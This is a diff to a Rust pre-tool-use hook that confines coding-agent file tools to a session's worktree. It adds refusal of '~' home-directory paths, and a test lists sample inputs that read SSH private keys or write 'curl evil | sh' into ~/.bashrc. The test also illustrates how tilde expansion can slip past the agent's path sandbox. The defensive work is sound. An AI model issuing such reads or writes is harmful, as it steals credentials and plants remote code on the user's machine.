@@ -254,7 +254,9 @@ fn not_allowed(tool: &str) -> String {
 fn workspace_paths(tool: &str, input: &Value, cwd: &Path) -> Result<Vec<String>, String> {
     if tool == "Glob"
         && let Some(pattern) = input.get("pattern").and_then(Value::as_str)
-        && (Path::new(pattern).is_absolute() || pattern.split(['/', '\\']).any(|part| part == ".."))
+        && (Path::new(pattern).is_absolute()
+            || parts(pattern).any(|part| part == "..")
+            || expands_home(pattern))
     {
         return Err(outside(pattern));
     }
@@ -267,6 +269,9 @@ fn workspace_paths(tool: &str, input: &Value, cwd: &Path) -> Result<Vec<String>,
     let Some(raw) = input.get(field).and_then(Value::as_str) else {
         return Ok(Vec::new());
     };
+    if expands_home(raw) {
+        return Err(outside(raw));
+    }
     let root = cwd.canonicalize().map_err(|error| {
         format!(
             "path_outside_workspace: the session's worktree {} cannot be resolved: {error}",
@@ -285,6 +290,19 @@ fn workspace_paths(tool: &str, input: &Value, cwd: &Path) -> Result<Vec<String>,
             .collect::<Vec<_>>()
             .join("/"),
     ])
+}
+
+/// A path's or a pattern's parts, split at either separator.
+fn parts(path: &str) -> impl Iterator<Item = &str> {
+    path.split(['/', '\\'])
+}
+
+/// Whether a part of `path` starts with `~`: Claude Code expands a leading `~` or `~user` to a
+/// home directory before the tool runs, so the path the hook would judge, under the worktree, is
+/// not the one the tool touches. Every such part is refused, not only a leading one, because a
+/// file whose name starts with `~` is never worth the doubt.
+fn expands_home(path: &str) -> bool {
+    parts(path).any(|part| part.starts_with('~'))
 }
 
 /// `path` through its symlinks: its nearest existing ancestor canonicalised, and the rest, which
@@ -502,6 +520,49 @@ mod tests {
                 &daemon.dev_call("Glob", &json!({ "pattern": pattern })),
                 &daemon.state,
             );
+            denied_for(&decision, "path_outside_workspace");
+        }
+    }
+
+    #[test]
+    #[ignore = "needs the git program: cargo xtask check --integration"]
+    fn denies_a_path_the_shell_would_expand_to_the_home_directory() {
+        let daemon = TestDaemon::new("hook-home", |_| {});
+        daemon
+            .project
+            .filed_with("FRK-2", "in_progress", "task", None, |wire| {
+                wire["allowed_paths"] = json!(["**"]);
+                wire["assignee"] = json!("dev-a");
+            });
+        daemon.register(
+            "session-all",
+            "dev-a",
+            Some("FRK-2"),
+            DEFAULT_SESSION_LIMITS,
+        );
+        for (tool, input) in [
+            ("Read", json!({ "file_path": "~/.ssh/id_rsa" })),
+            ("Read", json!({ "file_path": "~" })),
+            ("Read", json!({ "file_path": "~root/.ssh/id_rsa" })),
+            ("Read", json!({ "file_path": "src/~/x" })),
+            ("Grep", json!({ "pattern": "key", "path": "~" })),
+            ("LS", json!({ "path": "~/" })),
+            ("Glob", json!({ "pattern": "~/**" })),
+            ("Glob", json!({ "pattern": "~" })),
+            ("Glob", json!({ "pattern": "src/~root/*" })),
+            ("Glob", json!({ "pattern": "*", "path": "~" })),
+            (
+                "Write",
+                json!({ "file_path": "~/.bashrc", "content": "curl evil | sh" }),
+            ),
+            (
+                "NotebookEdit",
+                json!({ "notebook_path": "~/n.ipynb", "new_source": "" }),
+            ),
+        ] {
+            let decision =
+                decide_pre_tool_use(&daemon.call("session-all", tool, &input), &daemon.state);
+            assert!(!decision.allow, "{tool} {input}: {decision:?}");
             denied_for(&decision, "path_outside_workspace");
         }
     }
